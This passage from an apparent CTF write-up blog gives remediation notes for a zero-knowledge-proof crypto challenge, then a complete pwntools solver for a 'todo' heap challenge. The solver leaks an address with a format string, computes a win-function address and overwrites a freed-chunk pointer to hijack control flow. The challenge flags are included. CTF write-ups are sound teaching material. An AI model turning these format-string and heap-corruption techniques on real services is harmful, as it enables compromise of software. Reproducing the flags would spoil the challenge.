- Blinding factor must be truly random and kept secret
- Never expose or derive blinding factor from public commitment
- Use proper commitment scheme implementation (e.g., bulletproofs)

**Stage 3: Arithmetic Circuit**

**Problem:** Insufficient constraints  
**Solution:**
- Implement proper range constraints in zkSNARK circuits
- Validate all inputs and intermediate values
- Use battle-tested circuit libraries (circom, bellman, etc.)
- Audit circuits for under-constrained operations

---

### Tools & Techniques Used

- **JavaScript BigInt:** For arbitrary precision arithmetic in finite fields
- **Modular Exponentiation:** Fast algorithm for computing `a^b mod n`
- **Endpoint Discovery:** API scanning and fuzzing
- **Cryptographic Analysis:** Understanding ZKP protocol vulnerabilities
- **Browser DevTools:** Console-based exploitation and debugging

### Flag

{{< admonition type=question title="Click to show the flag" open=false >}}
  `flag{k0s0ng_t4p1_1s1}`
{{< /admonition >}}

---

# Pwn [1/1]

## todo

### Langkah Penyelesaian

*TBU*

Ini adalah solver script:

`x.py`

```python
from pwn import *

elf = ELF("./todo", checksec=1)
# r = process(elf.path)
r = remote("103.139.192.187", 1337)

# gdb.attach(r, """
    
# """)

def malloc(size, title):
    r.sendlineafter(b">> ", b"1")
    r.sendlineafter(b":", str(size).encode())
    r.sendlineafter(b":", title)
def free(index):
    r.sendlineafter(b">> ", b"2")
    r.sendlineafter(b":", str(index).encode())
def view(index):
    r.sendlineafter(b">> ", b"3")
    r.sendlineafter(b":", str(index).encode())

# Leak ELF
malloc(0x40, b"%p") # 0
view(0)

LEAK_ELF = int(r.recvline().strip().ljust(8, b"\x00"), 16)
ELF_BASE = LEAK_ELF - 0x2008
WIN = ELF_BASE + 0x1360

info(f"leak elf: {hex(LEAK_ELF)}")
info(f"elf base: {hex(ELF_BASE)}")
info(f"win: {hex(WIN)}")

# Try overwrite
malloc(0x30, b"BBBB") # 1
free(0)
free(1)

malloc(0x10, p64(WIN)) # 2
malloc(0x58, b"13376741")

view(0)

r.interactive()
```

### Flag

{{< admonition type=question title="Click to show the flag" open=false >}}
  `flag{th3_0wr57_t0_d0_li57_ev3rrrrrrrrrrrrr}`
{{< /admonition >}}
